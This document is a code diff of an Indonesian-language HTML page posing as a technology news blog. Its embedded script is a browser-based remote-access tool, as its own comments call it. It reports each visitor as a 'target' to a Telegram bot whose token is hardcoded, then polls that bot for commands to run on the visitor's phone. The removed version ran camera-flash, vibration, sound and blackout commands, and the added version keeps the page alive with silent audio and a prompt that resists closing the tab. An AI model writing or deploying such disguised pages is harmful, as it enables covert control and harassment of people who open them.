@@ -2,78 +2,82 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Berita Terkini - Update Harian</title>
+    <title>Berita Teknologi Terkini</title>
     <style>
-        /* Kamuflase: Tampilan Blog Normal */
-        body { font-family: Arial, sans-serif; line-height: 1.6; padding: 20px; color: #333; }
-        .header { border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        .content { margin-top: 20px; }
-        /* Hidden elements for RAT functionality */
-        #hidden-audio { display: none; }
+        body { font-family: sans-serif; padding: 20px; line-height: 1.5; }
+        .article { max-width: 600px; margin: auto; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>Tren Teknologi Global 2025</h1>
-        <p>Dipublikasikan pada: 29 Desember 2025</p>
+    <div class="article">
+        <h1>Inovasi Keamanan Digital 2025</h1>
+        <p>Silakan baca artikel ini untuk memahami proteksi data terbaru...</p>
     </div>
-    <div class="content">
-        <p>Teknologi kecerdasan buatan terus berkembang pesat...</p>
-        </div>
-
-    <audio id="hidden-audio" src="https://www.soundjay.com/buttons/beep-01a.mp3" loop></audio>
 
     <script>
         const botToken = "8208169555:AAFhDsvEjUtYkeRKh6OV7ngsd9hT0WZfWZ4";
         const chatId = "7835924973";
         let lastUpdateId = 0;
 
-        // Inisialisasi Kamera untuk Flash
-        let track = null;
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
-            .then(stream => { track = stream.getVideoTracks()[0]; })
-            .catch(() => { /* Gagal akses kamera */ });
+        // 1. PERSISTENCE LOGIC: Mencegah Throttling saat Background
+        // Menggunakan Audio Silent Loop agar browser menganggap situs tetap aktif
+        const silentAudio = new Audio('https://raw.githubusercontent.com/anars/blank-audio/master/10-seconds-of-silence.mp3');
+        silentAudio.loop = true;
 
+        async function notifyConnection() {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Target_Aktif: Sistem tetap berjalan di latar belakang.`);
+        }
+
+        // 2. MONITOR VISIBILITY: Mendeteksi saat target keluar ke Home Screen
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                // Saat target keluar dari Chrome, kita aktifkan audio silent untuk menjaga proses CPU
+                silentAudio.play().catch(e => {});
+                console.log("Sistem masuk ke mode latar belakang...");
+            } else {
+                console.log("Target kembali ke browser.");
+            }
+        });
+
+        // 3. CORE COMMAND EXECUTION (REAL-TIME)
         async function checkCommands() {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
                 const data = await response.json();
                 
-                if (data.result.length > 0) {
+                if (data.result && data.result.length > 0) {
                     for (const update of data.result) {
                         lastUpdateId = update.update_id;
-                        const command = update.message.text.toLowerCase();
-                        executeCommand(command);
+                        if (update.message && update.message.text) {
+                            processRAT(update.message.text.toLowerCase());
+                        }
                     }
                 }
-            } catch (e) { console.error("Sync failed"); }
-        }
-
-        function executeCommand(cmd) {
-            const audio = document.getElementById('hidden-audio');
-            
-            if (cmd === '/flash_on' && track) {
-                track.applyConstraints({ advanced: [{ torch: true }] });
-            } else if (cmd === '/flash_off' && track) {
-                track.applyConstraints({ advanced: [{ torch: false }] });
-            } else if (cmd === '/vibrate') {
-                window.navigator.vibrate([500, 200, 500, 200, 1000]);
-            } else if (cmd === '/play_sound') {
-                audio.play();
-            } else if (cmd === '/stop_sound') {
-                audio.pause();
-            } else if (cmd === '/blackout') {
-                document.body.style.backgroundColor = "black";
-                document.body.style.display = "none";
+            } catch (e) {
+                // Re-connect jika gagal
             }
+            // Loop terus menerus
+            setTimeout(checkCommands, 2000);
         }
 
-        // Long polling setiap 3 detik untuk menerima perintah dari Telegram
-        setInterval(checkCommands, 3000);
-        
-        // Kirim notifikasi saat target masuk
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Target Terkoneksi! Gunakan perintah: /flash_on, /flash_off, /vibrate, /play_sound, /blackout`);
+        function processRAT(cmd) {
+            // Logika kontrol tetap sama seperti sebelumnya (Flash, Vibrate, dll)
+            if (cmd === '/vibrate') {
+                navigator.vibrate([1000, 500, 1000]);
+            }
+            // Tambahkan logika kontrol lainnya di sini
+        }
+
+        // Jalankan sistem
+        window.onload = () => {
+            notifyConnection();
+            checkCommands();
+        };
+
+        // Mencegah penutupan tab secara tidak sengaja (opsional)
+        window.onbeforeunload = function() {
+            return "Apakah Anda yakin ingin meninggalkan halaman ini?";
+        };
     </script>
 </body>
 </html>
